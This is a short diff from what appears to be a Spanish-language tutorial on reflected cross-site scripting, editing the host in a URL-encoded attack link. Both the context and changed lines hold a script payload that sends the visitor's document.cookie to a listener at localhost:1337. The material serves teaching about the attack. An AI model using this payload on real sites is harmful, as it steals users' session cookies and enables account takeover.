@@ -179,7 +179,7 @@ http://IP/welcome.php?q=<script>new Image().src="http://localhost:1337/?stolen_c
 Pero esta URL no la entenderá correctamente el navegador, tenemos que codificarla:
 
 ----
-http://localhost:8080/welcome.php?q=%3Cscript%3Enew%20Image().src%20%3D%20%22http%3A%2F%2Flocalhost%3A1337%2F%3Fstolen_cookie%3D%22%20%2B%20document.cookie%3B%3C/script%3E
+http://IP/welcome.php?q=%3Cscript%3Enew%20Image().src%20%3D%20%22http%3A%2F%2Flocalhost%3A1337%2F%3Fstolen_cookie%3D%22%20%2B%20document.cookie%3B%3C/script%3E
 ----
 
 ==== Los detalles importan
